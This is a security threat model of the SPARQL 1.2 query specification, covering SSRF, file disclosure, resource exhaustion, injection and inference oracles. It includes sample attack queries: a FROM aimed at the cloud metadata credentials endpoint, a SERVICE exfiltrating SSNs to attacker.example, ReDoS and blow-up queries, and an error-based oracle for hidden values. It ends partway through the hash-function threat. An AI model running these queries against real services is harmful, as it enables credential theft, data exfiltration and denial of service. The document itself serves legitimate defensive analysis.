# Threat Model — SPARQL 1.2 Query Language

**Subject:** `spec/index.html` — SPARQL 1.2 Query Language, Editor's Draft
**Reviewed at:** commit `7f707ff` (2026-10-01)
**Status:** Not a W3C publication; carries no normative weight; does not represent Working Group consensus.

A description of the threats the SPARQL 1.2 Query Language presents: for each of 34 threats, the mechanism by which the language gives rise to it, its impact, and its severity in each of five deployment profiles. **This document describes the threats and does not recommend countermeasures.** It is self-contained.

Section references are given as stable fragment ids from the specification (e.g. [`#specifyingDataset`](../../../spec/index.html#specifyingDataset)), because the published section *numbers* are generated by ReSpec and move as the draft changes.

---

## 1. Scope

### 1.1 In scope

The query language as this document defines it: the concrete syntax and grammar ([`#sparqlSyntax`](../../../spec/index.html#sparqlSyntax), [`#grammar`](../../../spec/index.html#grammar)), the dataset-description constructs ([`#specifyingDataset`](../../../spec/index.html#specifyingDataset)), the algebra and evaluation semantics ([`#sparqlDefinition`](../../../spec/index.html#sparqlDefinition)), the function library ([`#SparqlOps`](../../../spec/index.html#SparqlOps)), and the defined extension points ([`#operatorExtensibility`](../../../spec/index.html#operatorExtensibility), [`#extensionFunctions`](../../../spec/index.html#extensionFunctions), [`#sparqlBGPExtend`](../../../spec/index.html#sparqlBGPExtend)).

### 1.2 Out of scope, with the boundary noted

| Area | Why out of scope | Where the boundary leaks back in |
| --- | --- | --- |
| SPARQL 1.2 Protocol | Transport, authentication, HTTP caching, request size limits are defined there | The protocol can override the in-query dataset description ([`#specifyingDataset`](../../../spec/index.html#specifyingDataset)) — this is the main authorization hook, so it is discussed |
| SPARQL 1.2 Update | Separate document | **The grammar is shared.** [`#grammar`](../../../spec/index.html#grammar): "The SPARQL grammar covers both SPARQL Query and SPARQL Update", with two entry points `QueryUnit` and `UpdateUnit`. Entry-point confusion is in scope (SQ-INJ-02) |
| SPARQL 1.2 Federated Query | `SERVICE` semantics defined there; [`#basic-federated-query`](../../../spec/index.html#basic-federated-query) is a one-paragraph pointer | **The `SERVICE` grammar is in this document**: `ServiceGraphPattern ::= 'SERVICE' 'SILENT'? VarOrIri GroupGraphPattern`. The syntactic attack surface — notably `VarOrIri` — is in scope (SQ-NET-03) |
| Result formats (XML, JSON, CSV/TSV) | Serialization-level issues (e.g. CSV formula injection) belong to those documents | Blank node label generation is constrained here ([`#BlankNodesInResults`](../../../spec/index.html#BlankNodesInResults)) — in scope (SQ-CONF-05) |
| Entailment regimes | Separate document | [`#sparqlBGPExtend`](../../../spec/index.html#sparqlBGPExtend) defines the extension point and its (weak) obligations — in scope (SQ-EXT-02) |
| RDF 1.2 Concepts, Turtle | Term model and parsing of data | Referenced where the query language inherits a property (RDF strings, surrogate exclusion, triple terms) |

### 1.3 What a threat model for a query *specification* can say

This document defines **meaning**. It deliberately defines neither **cost** nor **policy**. The threats below therefore fall into three kinds, which differ in where they originate:

1. **Threats the language creates.** Constructs that cause a conforming processor to take a security-relevant action: dereference an IRI, contact a remote service, execute third-party code. These are properties of the language itself.
2. **Threats the cost model permits.** Constructs that are cheap to write and superlinear to evaluate. They cannot be removed without changing the language, and the specification is silent on bounding them.
3. **Threats in how the language is embedded.** Injection, access control, logging. These are properties of a deployment rather than of the language, and appear here because the language shapes what a deployment can be asked to do.

### 1.4 A structural finding

Verified by exhaustive search of the document: **the only place this specification licenses a service to refuse a request is the dataset description.**

> [`#specifyingDataset`](../../../spec/index.html#specifyingDataset): "A query service may refuse a query request if the dataset description is not acceptable to the service."

There is no statement anywhere in the document that a service may impose resource limits, bound recursion depth, cap result size, or abort an expensive query — and [`#conformance`](../../../spec/index.html#conformance) speaks only to query strings, query results, and the media type. Any limit a service imposes on the constructs in §3.B is therefore something it does without the specification saying it may.

The same gap appears in the current [`#security`](../../../spec/index.html#security) section, which is inherited largely unchanged from SPARQL 1.1: it covers dereference-driven indirection, `file:` URIs, extensions, and IRI confusables, but says nothing about resource exhaustion, query injection, the absence of an access-control model, or `SERVICE`. [`#privacy`](../../../spec/index.html#privacy) is `TODO`.

| Boundary | Crossing | Dominant threats |
| --- | --- | --- |
| **TB0** | Untrusted application input → query text | Injection (SQ-INJ-01, SQ-INJ-02) |
| **TB1** | Client → service; the query is attacker-authored data | Everything else; this is the primary boundary |
| **TB2** | Service → network/filesystem, *initiated by the query* | SSRF, exfiltration, amplification (SQ-NET-\*) |
| **TB3** | Engine → extension code, *named by the query* | Arbitrary code in the evaluation path (SQ-EXT-01) |

The defining property of TB1 is that **the query is a program the attacker writes and the service runs**. Unlike a form field, a query is not data to be validated — it is executable structure. Any control that works by inspecting the query *text* rather than the translated algebra is on the wrong side of a parser differential (SQ-INJ-03).

### 2.2 Deployment profiles

Applicability is dominated by which of these a deployment is. Threat ratings in §3 are given for the profile where each threat matters most; the summary in §4 breaks them out.

| | Profile | Characteristics |
| --- | --- | --- |
| **P1** | Public open endpoint | Unauthenticated, arbitrary queries, public data. Availability is the whole game; confidentiality is near-vacuous for the data but *not* for the host |
| **P2** | Authenticated multi-tenant service | Per-tenant data in one store, often separated by named graph. Confidentiality and tenant isolation dominate |
| **P3** | Embedded library / in-process engine | Query may come from application logic or from a user. Injection and in-process resource exhaustion dominate; TB1 may be absent |
| **P4** | Internal analytics endpoint | Trusted-ish users, sensitive data, network reachability to internal systems. SSRF and exfiltration dominate; this is the classic "soft target behind the firewall" the current [`#security`](../../../spec/index.html#security) section alludes to |
| **P5** | Federation participant | Issues and accepts `SERVICE` requests. Cross-domain data movement, credential handling, amplification |

### 2.3 Assets

| | Asset | Notes |
| --- | --- | --- |
| **A1** | Dataset contents | Including graphs the requester is not meant to see |
| **A2** | Dataset *metadata* | Graph names, predicate vocabulary, cardinalities. Routinely sensitive on its own: graph IRIs commonly encode tenant ids, customer names, case numbers, dates, source systems |
| **A3** | Service availability | CPU, memory, disk, file handles, connection pool |
| **A4** | The service's network position | Reachability to internal hosts and to the cloud metadata endpoint. Often the most valuable asset, and not one the service owner thinks of as an asset |
| **A5** | The service's identity | Credentials it holds, and the fact that requests appear to originate from it |
| **A6** | Host filesystem and process | Via `file:` IRIs and extension code |
| **A7** | Query text itself | Contains the selectors — an email, account number, patient id — and so is PII-bearing. See SQ-CONF-07 |
| **A8** | Result integrity | For any consumer that signs, caches, diffs, or replays results |

### 2.4 Adversaries

| | Adversary | Capability | Relevant profiles |
| --- | --- | --- | --- |
| **AD1** | Anonymous remote | Submit arbitrary query strings | P1, P4 (if exposed) |
| **AD2** | Authenticated low-privilege user | As AD1, plus a legitimate identity and some authorized data access to pivot from | P2, P4 |
| **AD3** | Malicious co-tenant | AD2, plus knowledge of the schema and graph-naming convention | P2 |
| **AD4** | Application end-user | Controls only a *field* that the application interpolates into a query | P3, and any app in front of P1/P2/P4 |
| **AD5** | Malicious data publisher | Controls a graph the service dereferences, or can write triples to the store | P4, P5 |
| **AD6** | Malicious federation peer | Controls an endpoint named in `SERVICE`, or issues `SERVICE` requests to us | P5 |
| **AD7** | Curious insider | Legitimate broad query access; the threat is inference and bulk extraction, not access | P2, P4 |

## 3. Threat catalogue

Risk is qualitative: **Impact** × **Ease** (how cheap the attack is to mount), judged for the stated profile.

- *Ease — High:* a short query, no special knowledge, no authentication beyond what the profile grants.
- *Impact — High:* loss of confidentiality of A1/A2, compromise of A4/A5/A6, or sustained denial of A3.

### 3.A Outbound requests — the service as a confused deputy

The language lets a query direct the service to fetch things. The service, not the client, makes those requests, with the service's network position (A4) and identity (A5). This is the highest-severity category for P4 and P5.

---

#### SQ-NET-01 — SSRF via `FROM` / `FROM NAMED`

**Risk: High** (P4, P5) / Medium (P1) · Impact High · Ease High

**Mechanism.** [`#specifyingDataset`](../../../spec/index.html#specifyingDataset) is explicit that these clauses specify the dataset *by reference*: the clauses "indicate that the dataset should include graphs that are obtained from representations of the resources identified by the given IRIs". The IRIs are chosen by the query author. Nothing in the document restricts the scheme, the host, or the address.

```sparql
SELECT * FROM <http://169.254.169.254/latest/meta-data/iam/security-credentials/>
WHERE { ?s ?p ?o }
```

**Impact.** Requests to addresses reachable only from the service: cloud instance-metadata endpoints (credential theft → A5), internal admin APIs, `localhost` management ports. Port and host scanning via differential timing and error behaviour, even when no content is returned. The current [`#security`](../../../spec/index.html#security) section already names the shape of this — "The endpoint is potentially within an organisations firewall or DMZ, and so such queries may be a source of indirection attacks" — but does not name SSRF, the metadata endpoint, or redirect handling.

---

#### SQ-NET-02 — Local file disclosure via `file:` and other schemes

**Risk: High** (P3, P4) · Impact High · Ease High

**Mechanism.** No scheme restriction exists in the language. [`#security`](../../../spec/index.html#security) acknowledges the result: "the contents of `file:` URIs can in some cases be accessed, processed and returned as results, providing unintended access to local resources." Beyond `file:`, whatever schemes the implementation's URI handler supports are reachable — `jar:`, `ftp:`, `gopher:`, and in some stacks `expect:` or `php:`.

**Impact.** Arbitrary file read as the engine's user: configuration, private keys, credentials, `/proc` contents. Two exfiltration channels: if the file parses as RDF, its content appears in results directly; if it does not, parse-success versus parse-failure is a file-existence and partial-content oracle.

---

#### SQ-NET-03 — SSRF *and bidirectional exfiltration* via `SERVICE`, including variable endpoints

**Risk: Critical** (P2, P4, P5) · Impact High · Ease High

**Mechanism.** The semantics live in Federated Query, but the grammar is here:

```
ServiceGraphPattern ::= 'SERVICE' 'SILENT'? VarOrIri GroupGraphPattern
```

`VarOrIri` is the significant part: **the endpoint may be a variable**, bound at evaluation time — from `VALUES`, from `BIND(IRI(CONCAT(...)))`, or *from the data itself*. The dereference target therefore need not appear anywhere in the query text, which defeats any control that allowlists IRIs by inspecting the query statically.

**Impact — two directions, and the outbound one is the serious one.**

*Inbound* (as SQ-NET-01, but worse): the attacker controls not just the URL but a full request body.

*Outbound exfiltration.* A federated evaluation sends locally-held bindings to the remote endpoint as part of the remote request. That converts read access on a protected dataset into a **data exfiltration channel that does not require the attacker to see the query results at all**:

```sparql
SELECT * WHERE {
  GRAPH <urn:tenant:victim> { ?s <http://ex/ssn> ?secret }
  SERVICE <https://attacker.example/collect> { ?s ?p ?secret }
}
```

This matters because many deployments reason about confidentiality purely in terms of *what the client is shown*. `SERVICE` breaks that: the data leaves via the service's own egress. `SILENT` then suppresses errors from the client's view, which is exactly what an attacker wants while iterating.

*Amplification / reflection.* The service becomes an attack proxy against third parties, with its own IP and reputation.

---

#### SQ-NET-04 — Base IRI ambiguity relocates the dereference target

**Risk: Medium** (P3, P4) · Impact Medium · Ease Medium

**Mechanism.** [`#relIRIs`](../../../spec/index.html#relIRIs) specifies that, absent a `BASE` keyword, the base IRI may come from the encapsulating entity (RFC 3986 §5.1.2), from the retrieval URI of the query (§5.1.3), or from a default base (§5.1.4). The same query text therefore resolves relative IRIs — including those in `FROM` and `SERVICE` — differently in different deployments. Compounding it, the same section states that "Neither Syntax-Based Normalization nor Scheme-Based Normalization ... are performed".

**Impact.** A query reviewed and approved in one context dereferences something else in another. Allowlists keyed on IRI strings are bypassed by alternative spellings of the same target, and simultaneously block legitimate equivalent spellings.

---

#### SQ-NET-05 — Ingestion of attacker-controlled RDF

**Risk: Medium** (P4, P5) · Impact Medium · Ease Medium

**Mechanism.** Dereferenced representations are parsed and, for `FROM`, RDF-merged into the default graph ([`#specifyingDataset`](../../../spec/index.html#specifyingDataset)). The remote server — not the query author, and not the service — controls the size and content of what arrives.

**Impact.** Decompression and size bombs; unbounded parse time; and, for the duration of the query, adversarial triples are *inside* the dataset, where they influence `GRAPH ?g` results and can be laundered through a `CONSTRUCT` into a downstream system that trusts the service's output.

---

### 3.B Availability — resource exhaustion

The governing fact: **SPARQL query evaluation is computationally hard in the size of the query**, and the language offers several independent routes to superlinear work. Evaluation of the full algebra is PSPACE-complete in combined complexity; nested `OPTIONAL` alone is NP-hard. A hundred-byte query can demand more work than the dataset has triples, several times over.

The language places **no bound on anything**: not query length, nesting depth, result cardinality, `LIMIT`/`OFFSET` magnitude, string length, or numeric magnitude. That is a legitimate design choice for a semantics document. Combined with §1.4, it means a service that bounds any of these constructs does so with no statement in the specification that it may.

---

#### SQ-DOS-01 — Join and cross-product explosion

**Risk: High** (P1, P4) · Impact High · Ease High

**Mechanism.** Unconnected basic graph patterns form Cartesian products; `UNION` multiplies alternatives ([`#alternatives`](../../../spec/index.html#alternatives)); nested `OPTIONAL` ([`#MultipleOptionals`](../../../spec/index.html#MultipleOptionals)) is the NP-hard case. A query of *k* unconnected triple patterns has an intermediate result of size |G|^k.

```sparql
SELECT * WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l }
```

---

#### SQ-DOS-02 — Property path explosion

**Risk: High** (P1, P4) · Impact High · Ease High

**Mechanism.** [`#propertypath-arbitrary-length`](../../../spec/index.html#propertypath-arbitrary-length) guarantees *termination and no duplicates* — "Connectivity matching is defined so that matching cycles does not lead to undefined or infinite results" — but says nothing about cost, which is unbounded. Evaluation is defined by recursive traversal (`ALP` / `reachableTerms`, [`#PropertyPathPatterns`](../../../spec/index.html#PropertyPathPatterns)).

```sparql
SELECT * WHERE { ?s (!<urn:x>)* ?o }      # transitive closure over every predicate, both ends free
SELECT * WHERE { ?s ((:p|:q)/(:r|:s))* ?o }  # alternation nested inside closure
```

With both endpoints unbound, `*` and `+` force computation of a transitive closure over the whole graph — quadratic in the node count in the worst case, and the negated property set `!` forces a full predicate scan. Nesting multiplies.

---

#### SQ-DOS-03 — Sort, grouping, and aggregation memory

**Risk: High** (P1, P4) · Impact High · Ease High

**Mechanism.** `ORDER BY` requires the whole solution sequence to be materialized before ordering, and the algebra applies `Slice` *after* `OrderBy` ([`#convertSolMod`](../../../spec/index.html#convertSolMod), [`#sparqlOffsetLimit`](../../../spec/index.html#sparqlOffsetLimit)) — **so `LIMIT 1` does not bound the work of an `ORDER BY` query.** `GROUP BY` on a computed or high-cardinality key creates one group per solution. `DISTINCT` over a wide projection requires a set of all solutions. `GROUP_CONCAT` ([`#aggGroupConcat`](../../../spec/index.html#aggGroupConcat)) builds one unbounded string per group, and a naive implementation builds it quadratically.

```sparql
SELECT (GROUP_CONCAT(?o) AS ?all) WHERE { ?s ?p ?o }  # one string, whole dataset
SELECT ?k (COUNT(*) AS ?c) WHERE { ?s ?p ?o } GROUP BY (RAND() AS ?k)  # one group per solution
```

---

#### SQ-DOS-04 — String and numeric amplification

**Risk: Medium-High** (P1, P3, P4) · Impact High · Ease Medium

**Mechanism — strings.** `CONCAT` of a value with itself, chained through subqueries or successive `BIND`s, doubles length per step: linear query text, exponential memory.

```sparql
SELECT ?x8 WHERE {
  BIND("payload" AS ?x0) BIND(CONCAT(?x0,?x0) AS ?x1) BIND(CONCAT(?x1,?x1) AS ?x2)
  # ... 30 steps → ~1 GB from one short query
}
```

**Mechanism — numerics.** The grammar is unbounded: `INTEGER ::= [0-9]+` and `EXPONENT ::= [eE] [+-]? [0-9]+`, with no digit limit. `xsd:integer` and `xsd:decimal` are arbitrary-precision in XSD 1.1. So a literal with ten million digits is syntactically valid and must be parsed; repeated multiplication of large integers is a CPU and memory sink. `LimitClause ::= 'LIMIT' INTEGER` and `OffsetClause ::= 'OFFSET' INTEGER` are likewise unbounded — `OFFSET 99999999999999999999` is legal, and is both a deep-scan request and an integer-overflow test case for the implementation.

---

#### SQ-DOS-05 — Regular-expression denial of service

**Risk: High** (P1, P3, P4) · Impact High · Ease High

**Mechanism.** [`#func-regex`](../../../spec/index.html#func-regex) and [`#func-replace`](../../../spec/index.html#func-replace) delegate to XPath `fn:matches` and `fn:replace`. The XSD regex language includes constructs — nested quantification, and back-references in the XPath 3.1 flavour — that make a backtracking engine exponential in the subject length. Both the pattern and the subject are *expressions*, so either may be a variable, and therefore may come from the data or from an untrusted application parameter.

```sparql
SELECT * WHERE { ?s ?p ?o FILTER(REGEX(?o, "^(a+)+$")) }
```

One `FILTER` evaluated over many rows is an extremely cheap CPU bomb, and the per-row cost multiplies the per-match cost.

---

#### SQ-DOS-06 — Parser and evaluator stack exhaustion from unbounded nesting

**Risk: High** (all profiles) · Impact Medium-High · Ease High

**Mechanism.** The grammar is recursive with no depth bound, and [`#sparqlGrammar`](../../../spec/index.html#sparqlGrammar) notes it "is LL(1) when the rules with uppercase names are used as terminals" — which makes recursive descent the natural implementation, and recursive descent on unbounded nesting exhausts the call stack. Nesting is available at many points: `GroupGraphPattern`, subqueries, parenthesised expressions, RDF collections, and — newly in 1.2 — nested triple patterns `<<( <<( ... )>> ... )>>` and annotation blocks. The 1.2 change list records that `UnaryExpression` was amended to allow `!!`, so repeated `!` is now explicitly legal.

```sparql
ASK { FILTER(!!!!!!!!!! ... !!!!true) }     # one line, thousands of operators
ASK { { { { { { ... } } } } } }
ASK { ?s ?p <<( <<( <<( ... )>> )>> )>> }   # 1.2: deep triple-term nesting
```

Deeply nested triple terms then force recursive work *after* parsing too: in `TRIPLE`/`SUBJECT`/`PREDICATE`/`OBJECT` ([`#func-triple-terms`](../../../spec/index.html#func-triple-terms)), in term comparison and ordering (which [`#modOrderBy`](../../../spec/index.html#modOrderBy) now extends to triple terms), and in hashing and indexing.

---

#### SQ-DOS-07 — Syntactic-sugar expansion defeats input-size limits

**Risk: Medium** (all profiles) · Impact Medium · Ease Medium

**Mechanism.** Several constructs expand during translation ([`#sparqlExpandForms`](../../../spec/index.html#sparqlExpandForms)). [`#syntaxReifyingTriples`](../../../spec/index.html#syntaxReifyingTriples) expands `<< s p o >> :q ?v` into a `rdf:reifies` triple plus the annotation triples, allocating "a fresh blank node that is not used anywhere else in the query". [`#syntaxAnnotation`](../../../spec/index.html#syntaxAnnotation) expands an annotation block into the asserted triple plus one reifying triple plus one triple per annotation, with a fresh blank node per block. RDF collections ([`#collections`](../../../spec/index.html#collections)) expand into `rdf:first`/`rdf:rest` chains. Predicate-object and object lists multiply.

Expansion is **multiplicative when nested**, so the post-expansion algebra can be far larger than the source text.

**Impact.** Any limit applied to the byte count of the received query is the wrong limit. This is a new and sharper concern in 1.2, because reification and annotation syntax are compact on the surface and expansive underneath.

---

#### SQ-DOS-08 — Correlated `EXISTS` / `NOT EXISTS` / `MINUS` cost

**Risk: Medium-High** (P1, P4) · Impact High · Ease Medium

**Mechanism.** [`#neg-exists`](../../../spec/index.html#neg-exists) now gives `EXISTS` a formal definition in which the inner pattern is evaluated **with respect to a solution mapping μ** — the 1.2 change list records `eval` being extended with "a solution mapping μ_ctx as a third argument". Semantically this is a clarification and an improvement. Operationally, read literally it is one inner evaluation per outer solution: *N* × cost(inner). The inner pattern may itself contain a property path or another `EXISTS`, so nesting multiplies.

**Impact.** A correct implementation is not automatically a bounded-cost one. A short query with two levels of `EXISTS` over a moderate dataset can be effectively unbounded.

---

#### SQ-DOS-09 — Amplification asymmetry (summary)

The threats above share a shape worth naming: **request cost is negligible, evaluation cost is unbounded, and the ratio is attacker-chosen.** That is what makes an open endpoint a standing availability target, and what makes rate limiting by *request count* an ineffective measure of load. With `SERVICE` and `FROM` it also makes the service an amplifier against third parties and against itself.

### 3.C Injection and parsing integrity

#### SQ-INJ-01 — Query injection via string construction

**Risk: High** (P2, P3, and any application in front of P1/P4) · Impact High · Ease High

**Mechanism.** The threat lives in the *application* (TB0), but the available vectors are properties of this grammar, and the specification is where developers will look for them:

| Vector | Grammar basis | Payload shape |
| --- | --- | --- |
| Close a string literal | `"` / `'` delimiters, [`#QSynLiterals`](../../../spec/index.html#QSynLiterals) | `" } ... { "` |
| Trailing backslash | `'\\'` escape, [`#sec-escapes`](../../../spec/index.html#sec-escapes) | input ending `\` consumes the app's own closing quote |
| Escape a comment | [`#grammarComments`](../../../spec/index.html#grammarComments): comments "continue to the end of line (marked by characters 0x0D or 0x0A)" | inject `\n` to break out of a `#` comment |
| Close an IRI | `IRIREF` delimiters | `>` inside interpolated IRI text |
| Prefixed-name local part | [`#sec-escapes`](../../../spec/index.html#sec-escapes): reserved-character escapes `~.-!$&'()*+,;=/?#@%_` are legal in local names | confuses naive validators |
| Add a clause | — | an extra `FROM`, `FROM NAMED`, `SERVICE`, `VALUES`, or `UNION { GRAPH ?g { ?s ?p ?o } }` to escape the intended graph |

**Impact.** Reading outside the intended graph or dataset (A1, A2); exfiltration via an injected `SERVICE` (SQ-NET-03) even when results are not shown to the attacker; denial of service via an injected expensive pattern; and escalation to write if update is reachable (SQ-INJ-02).

---

#### SQ-INJ-02 — Grammar-entry-point confusion (read → write escalation)

**Risk: Medium** · Impact High · Ease Low-Medium

**Mechanism.** [`#grammar`](../../../spec/index.html#grammar): "The SPARQL grammar covers both SPARQL Query and SPARQL Update", with "two entry points into the grammar: `QueryUnit` for the SPARQL query language, `UpdateUnit` for the SPARQL update language." A deployment that selects the entry point by *sniffing the content* rather than by the protocol operation and endpoint can be steered. Update additionally allows `;`-separated operation sequences — the structural analogue of stacked SQL statements.

---

#### SQ-INJ-03 — Parser differentials desynchronize security controls

**Risk: Medium-High** (any deployment with a query-inspecting gatekeeper) · Impact High · Ease Medium

**Mechanism.** Any control that inspects a query — a WAF, a rewriter, a cost estimator, an ACL enforcer, an audit logger — depends on its parse agreeing with the engine's. This grammar offers several ways for two parsers to disagree:

- **Escape processing.** See SQ-INJ-04: 1.1-era implementations processed escapes *before* parsing; 1.2 processes them *during* parsing. The two assign different meanings to the same string.
- **Longest-match tokenization.** [`#sparqlGrammar`](../../../spec/index.html#sparqlGrammar): "When tokenizing the input and choosing grammar rules, the longest match is chosen." [`#whitespace`](../../../spec/index.html#whitespace) gives the consequence concretely: `?a<?b&&?c>?d` is "the token sequence variable `?a`, an IRI `<?b&&?c>`, and variable `?d`, not an expression involving the operator `&&`". A gatekeeper that lexes differently is looking at a *different query*.
- **No IRI normalization**, and `%`-sequences left undecoded ([`#sec-escapes`](../../../spec/index.html#sec-escapes): "These sequences are not decoded during processing").
- **Case-insensitive keywords**, except `a`.
- **Error-case extensibility** ([`#extensionFunctions`](../../../spec/index.html#extensionFunctions)) — see SQ-EXT-01 — so "this expression errors" is not portable.

---

#### SQ-INJ-04 — The 1.2 escape-processing change is a security fix (and a migration hazard)

**Risk: High if unmigrated** · Note-worthy as a *hardening*

**Mechanism.** The 1.2 change list records: "Change escape sequence processing to be processed during parsing, not before. This aligns SPARQL with escape sequences in Turtle." [`#sec-escapes`](../../../spec/index.html#sec-escapes) now specifies single-pass, left-to-right processing with no rescanning of substituted output, and gives a worked table:

| Input | Output | Codepoints |
| --- | --- | --- |
| `abc\def` | `abc\def` | 7 |
| `abc\tuv` | `abc\tuv` | 7 — *not* a tab |
| `\\` | `\\` | 2 |

**Why this matters for security.** Under the 1.1 pre-parse model, `"` in an interpolated value could become a real `"` and terminate a literal — an injection that succeeded *even when the application escaped quotes correctly*. The 1.2 model closes that class, along with the `\`-smuggling variant where a decoded backslash combines with the following character to form a new escape. Separately, numeric escapes now "MUST NOT produce a code point value in the range U+D800 to U+DFFF", closing the lone-surrogate / ill-formed-UTF-8 smuggling class in which components disagree about a string's identity.

**Consequences.** Two consequences follow. The change is a real hardening, with an unhappy history in other languages. And an implementation still carrying 1.1-era pre-pass code is now both **non-conforming and vulnerable** — which also makes the migration window a parser-differential source (SQ-INJ-03).

---

#### SQ-INJ-05 — `VERSION` is a client assertion, not a guarantee

**Risk: Low-Medium** · Impact Low-Medium · Ease High

**Mechanism.** [`#syntaxVersionAnnouncement`](../../../spec/index.html#syntaxVersionAnnouncement): authors "MAY announce" the version, and "Processors may treat unrecognized labels as an error or as a warning." The protocol's `version` media-type parameter "is considered if there is no `VERSION` directive". Nothing requires the declaration to be *true* of the query's content: a query may use triple terms while declaring `"1.2-basic"`, or omit the directive entirely.

**Impact.** (a) *Fingerprinting* — probing which labels are accepted cheaply reveals engine version and feature set, and the "error or warning" latitude makes behaviour a distinguisher. (b) A gatekeeper that gates features on the declared version is trusting client-supplied metadata.

### 3.D Confidentiality and inference

#### SQ-CONF-01 — The language defines no access-control model

**Risk: structural — the premise of this whole category** (P2, P4)

**Mechanism.** Nothing in the document defines authorization, per-graph permissions, or triple-level security. The dataset is a flat structure ([`#rdfDataset`](../../../spec/index.html#rdfDataset)), and `GRAPH ?g` ranges over *all* named graphs in the active dataset ([`#queryDataset`](../../../spec/index.html#queryDataset)): the keyword may "use a variable which will range over the IRI of all the named graphs in the query's RDF dataset." A "the client only queries the default graph" assumption is not enforced by anything in the language.

Worse, [`#specifyingDataset`](../../../spec/index.html#specifyingDataset) lets the *query* redefine the dataset: "If a query provides such a dataset description, then it is used in place of any dataset that the query service would use if no dataset description is provided in a query."

**The protocol override.** The same paragraph continues: "The RDF dataset may also be specified in a SPARQL protocol request, in which case **the protocol description overrides any description in the query itself.**"

---

#### SQ-CONF-02 — Metadata enumeration

**Risk: Medium-High** (P2) · Impact Medium · Ease High

**Mechanism.** Two one-line queries. Graph names, via [`#accessByIdentifier`](../../../spec/index.html#accessByIdentifier) together with the empty group pattern ([`#emptyGroupPattern`](../../../spec/index.html#emptyGroupPattern), which matches once per graph):

```sparql
SELECT DISTINCT ?g WHERE { GRAPH ?g {} }
SELECT DISTINCT ?p WHERE { ?s ?p ?o }
```

**Impact.** Asset A2. Graph IRIs in practice encode tenant identifiers, customer names, case numbers, dates, source-system names, and ingest batch ids — so enumerating names leaks the shape of the business even when every triple is protected. Predicate enumeration recovers the schema, which is the prerequisite for every targeted attack that follows.

---

#### SQ-CONF-03 — Inference oracles: result-level filtering is not confidentiality

**Risk: High** (P2, P4) · Impact High · Ease Medium

**Mechanism.** When an authorization layer filters *results* while evaluation still touches protected data, the language provides several channels that reveal what was filtered:

**Error channel.** An error in a `FILTER` removes the solution ([`#expressions`](../../../spec/index.html#expressions): FILTERs "eliminate any solutions that ... either result in an effective boolean value of false **or produce an error**"), and errors propagate outward ([`#sparql-error`](../../../spec/index.html#sparql-error): "If the evaluation of an expression raises an error, then the evaluation of every function, operator, and expression that contains the expression with the error also raises an error"). So row presence encodes an arbitrary predicate over hidden values:

```sparql
ASK { ?s <http://ex/salary> ?v FILTER(1/(?v - 100000) > 0) }   # errors iff ?v = 100000
```

One bit per query, which is enough for binary search over a hidden value. The same trick works with `xsd:integer("...")` constructor errors, out-of-range `SUBSTR`, and datatype casts.

**Timing channel.** The functional forms `&&`, `||`, `IF`, and `COALESCE` have special evaluation rules ([`#expressions`](../../../spec/index.html#expressions), [`#func-forms`](../../../spec/index.html#func-forms)) — short-circuiting is exactly what makes conditional cost observable. `FILTER(?secret = "a" && <expensive path>)` reveals the comparison's outcome in the response time regardless of what is returned. [`#invocation`](../../../spec/index.html#invocation) adds that "The order of argument evaluation is not defined", so this is implementation-variable but rarely absent.

**Existence channel.** `NOT EXISTS` and `MINUS` ([`#negation`](../../../spec/index.html#negation)) test a pattern's presence without projecting any of its variables — a query can answer a question about data the requester may not read. `ASK` ([`#ask`](../../../spec/index.html#ask)) is the limit case: no data returned, one bit about the entire dataset.

**Cardinality channel.** `COUNT` over data that is filtered only on the way out.

---

#### SQ-CONF-04 — `DESCRIBE` is unbounded, implementation-defined disclosure

**Risk: Medium-High** (P2, P4) · Impact High · Ease High

**Mechanism.** [`#describe`](../../../spec/index.html#describe) is marked *Informative*, and leaves the content entirely open: "The description is determined by the query service", "The RDF returned is determined by the information publisher", and "It may include information about other resources". `DESCRIBE *` "describes all of the variables in a query", and for multiple solutions "the RDF data for each is the union of all RDF graph descriptions".

**Impact.** Three distinct problems. (a) If implemented as a blank-node closure or neighbourhood walk — which the spec's own example illustrates, returning a nested `vcard:N` structure — the walk can traverse *from* an authorized resource *into* unauthorized data, and it is not expressed as a pattern an ACL layer can inspect or rewrite. (b) Result size is unbounded and attacker-influenced. (c) Being informative and implementation-defined, its behaviour is unpredictable across engines, so no portable reasoning about what it discloses is possible.

---

#### SQ-CONF-05 — Blank node labels as a leak and a correlation handle

**Risk: Medium** (P2) · Impact Medium · Ease Low

**Mechanism.** The spec gives implementations full latitude here, and that latitude is also the licence to randomize. [`#BlankNodesInResults`](../../../spec/index.html#BlankNodesInResults): labels "are scoped to a result set ... or, for the `CONSTRUCT` query form, the result graph"; "the blank node identifiers in the results only indicate whether RDF terms in the solutions are the same or different"; and "There need not be any relation between a blank node identifier `_:a` in the result set and a blank node identifier used in the syntax for the data." [`#grammarBNodes`](../../../spec/index.html#grammarBNodes) adds that "Fresh blank nodes are generated for each request; blank nodes cannot be referenced by identifier across requests."

**Impact.** The threat is implementations that emit *internal* identifiers instead: row ids, primary keys, storage node ids, memory addresses, file offsets, or a monotonic counter. These leak internal structure — store size, insertion order, whether two results came from the same internal record — and if **stable across queries** they become a correlation handle for records the requester cannot otherwise read, which is precisely what the scoping rule is meant to prevent. A related hazard: `BNODE(str)` ([`#func-bnode`](../../../spec/index.html#func-bnode)) and `CONSTRUCT` templates ([`#templatesWithBNodes`](../../../spec/index.html#templatesWithBNodes)) mint labels from solution data, so a label derived by unsalted hashing of its input is an offline guessing oracle for that input.

---

#### SQ-CONF-06 — Hash functions: a guessing oracle, and two broken algorithms in the standard library

**Risk: Medium-High** (P2, P4) · Impact Medium-High · Ease High

**Mechanism.** [`#func-hash`](../../../spec/index.html#func-hash) provides `MD5`, `SHA1`, `SHA256`, `SHA384`, and `SHA512` over a literal's lexical form.

**Three distinct problems.**

1. **In-engine bulk guessing.** The attacker supplies candidates and the engine tests them against data it can read but the attacker cannot: `VALUES ?guess { ... }` joined with `FILTER(SHA256(?secret) = SHA256(?guess))` turns one query into as many guesses as the engine will evaluate. Confirmation requires only a one-bit answer, so `ASK` suffices.
2. **Offline cracking of returned digests.** A hash of a low-entropy value — email, phone number, national id, postcode — is reversible by enumeration. Note that the spec's own `DESCRIBE` example contains `foaf:mbox_sha1sum "bee135d3af1e418104bc42904596fe148e90f033"`, which is exactly this pattern: an unsalted SHA-1 of an email address, widely used in the FOAF ecosystem as a pseudonym, and trivially reversible.
